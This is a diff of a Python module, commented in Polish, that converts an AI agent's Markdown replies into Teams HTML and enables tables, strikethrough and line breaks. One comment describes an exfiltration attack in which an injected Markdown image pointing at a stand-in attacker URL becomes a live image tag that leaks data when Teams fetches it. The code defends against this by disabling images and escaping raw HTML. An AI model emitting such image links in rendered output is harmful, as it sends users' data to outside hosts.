@@ -3,7 +3,16 @@
 Model agenta emituje Markdown (``**pogrubienie**``, ``### nagłówek``, listy). Graph
 przy odpowiedzi na kanale przyjmuje ``contentType: "html"``, więc TU zamieniamy Markdown
 na podzbiór HTML renderowany przez Teams (``<strong>``/``<em>``, ``<ul>/<ol>/<li>``,
-``<h1>``–``<h6>``, ``<pre>/<code>``, ``<a>``, ``<blockquote>``, ``<p>``, ``<br>``).
+``<h1>``–``<h6>``, ``<pre>/<code>``, ``<a>``, ``<blockquote>``, ``<p>``, ``<br>``,
+``<table>``, ``<s>``).
+
+Czego tu ŚWIADOMIE NIE MA i dlaczego — żeby nie szukać tego drugi raz: obrazki są wyłączone
+(wyprowadzenie danych przez ``<img src>``, patrz niżej), surowy HTML jest escapowany (treść to
+DANE), a ``linkify`` (gołe adresy jako żywe linki) jest tu ZBĘDNY: zmierzone na żywo 2026-08-21 —
+Teams sam robi z gołego adresu klikalny odnośnik. Gdyby ktoś chciał go mimo to włączyć:
+reguła wymaga pakietu ``linkify-it-py``, którego w obrazie NIE MA, a ``enable("linkify")``
+bez niego RZUCA i zdegradowałoby cały render do zescapowanego tekstu — czyli lekarstwo
+gorsze od choroby.
 Dopełnia ``teams_graph/selection._strip_html`` (kierunek WEJŚCIOWY, zdejmowanie HTML z
 wiadomości przychodzących) o render w kierunku WYJŚCIOWYM.
 
@@ -42,13 +51,23 @@ def to_teams_html(markdown_text: str, *, allow_links: bool = True) -> str:
 
     try:
         # html=False: surowy HTML w treści modelu to DANE — escapujemy, nie przepuszczamy.
-        # Preset commonmark nie włącza tabel: Teams renderuje <table> niekonsekwentnie,
-        # więc md-tabele schodzą jako tekst (świadomy kompromis).
-        renderer = MarkdownIt("commonmark", {"html": False})
+        #
+        # breaks=True, bo to jest CZAT, nie dokument. Preset commonmark zwija pojedynczy znak
+        # nowej linii do spacji, więc każdy blok pisany linia-po-linii docierał jako jedno
+        # zdanie ciągiem. To ta sama przyczyna, dla której tabela bez reguły `table` schodziła
+        # nieczytelna: cały blok lądował w JEDNYM ``<p>``, a Teams zwija w nim znaki nowej linii.
+        renderer = MarkdownIt("commonmark", {"html": False, "breaks": True})
         # Wyłącz obrazki: treść notatek/wiadomości to niezaufane DANE, a wstrzyknięty
         # `![](https://atakujący/?d=...)` stałby się żywym <img src> — Teams mógłby go
         # pobrać, wyprowadzając dane. Markdown obrazka schodzi jako tekst (jak tabele).
         renderer.disable("image")
+        # Tabele: ZMIERZONE NA ŻYWO 2026-08-21 w wątku kanału (wiadomość techniczna wysłana tą
+        # samą drogą co odpowiedź agenta) — Teams renderuje ``<table>`` poprawnie. Wcześniejszy
+        # komentarz twierdził coś odwrotnego („renderuje niekonsekwentnie") i nie stał za nim
+        # ani ADR, ani pomiar; kontrprzykład leżał zresztą w tym samym repo, bo
+        # ``send_chat_html`` powstał WŁAŚNIE po to, żeby dostarczyć do Teams prawdziwą tabelę.
+        renderer.enable("table")
+        renderer.enable("strikethrough")  # `~~x~~` docierało jako tyldy
         if not allow_links:
             renderer.disable("link")  # niezaufana treść mostu — linki jako tekst (anty-phishing)
         return renderer.render(markdown_text)
